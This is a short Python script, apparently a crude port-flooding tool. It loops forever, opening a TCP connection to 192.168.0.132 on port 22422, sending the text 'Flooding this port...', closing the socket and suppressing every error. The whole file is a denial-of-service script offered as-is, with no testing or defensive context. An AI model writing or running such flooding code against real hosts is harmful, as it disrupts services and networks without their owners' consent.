import socket

target_ip = "192.168.0.132"
target_port = 22422

while True:
    try:
        s = socket.socket()
        s.connect((target_ip, target_port))
        s.send(b"Flooding this port...\n")
        print("Flooding this port...\n")
        s.close()
    except:
        pass
